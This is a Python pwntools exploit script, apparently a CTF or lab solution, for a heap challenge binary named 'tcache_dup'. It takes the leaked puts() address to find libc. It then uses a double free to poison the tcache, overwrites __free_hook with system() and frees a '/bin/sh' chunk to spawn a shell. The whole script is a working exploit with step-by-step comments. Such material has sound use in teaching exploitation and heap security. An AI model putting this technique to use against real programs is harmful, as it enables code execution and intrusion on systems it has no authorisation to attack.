#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.binary = elf = ELF('./tcache_dup', checksec=False)

#libc = ELF('', checksec=False)
libc = elf.libc 

gs = """
b *main

b *main+253

b *main+363
b *main+430

b *main+536
"""

def info(mess):
    return log.info(mess)

def success(mess):
    return log.success(mess)

def error(mess):
    log.error(mess)


def start():
    if args.GDB:
        return gdb.debug(elf.path, env={"LD_PRELOAD": libc.path},gdbscript=gs)
    elif args.REMOTE:
        return remote('', )
    else:
        return process(elf.path, env={"LD_LIBRARY_PATH": libc.path})


# Index of allocated chunks.
index = 0

# Select the "malloc" option; send size & data.
# Returns chunk index.
def malloc(size, data):
    global index
    io.send("1")
    io.sendafter("size: ", f"{size}")
    io.sendafter("data: ", data)
    io.recvuntil("> ")
    index += 1
    return index - 1

# Select the "free" option; send index.
def free(index):
    io.send("2")
    io.sendafter("index: ", f"{index}")
    io.recvuntil("> ")

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil("puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts
io.recvuntil("> ")
io.timeout = 0.1

# =============================================================================

# Request a 0x20-sized chunk.
dup = malloc(0x18, "A"*8)

# Leverage the double-free bug to free the "dup" chunk twice.
free(dup)
free(dup)

# The next request for a 0x20-sized chunk will be serviced by the "dup" chunk.
# Request it, then overwrite its tcachebin fd, pointing it at the free hook.
# There is no need to account for the chunk header because the tcache uses pointers to chunk user
# data rather than to chunk headers.
malloc(0x18, pack(libc.sym.__free_hook))

# Make another request for a 0x20-sized chunk; the same chunk is allocated to service this request.
# Write the string "/bin/sh" into this chunk for use later as the argument to system().
binsh = malloc(0x18, "/bin/sh\0")

# The next request for a 0x20-sized chunk is serviced by the fake chunk overlapping the free hook.
# Use it to overwrite the free hook with the address of system().
malloc(0x18, pack(libc.sym.system))

# Free the chunk with the string "/bin/sh" in the first qword of its user data.
# This triggers a call to system("/bin/sh").
free(binsh)

# =============================================================================

io.interactive()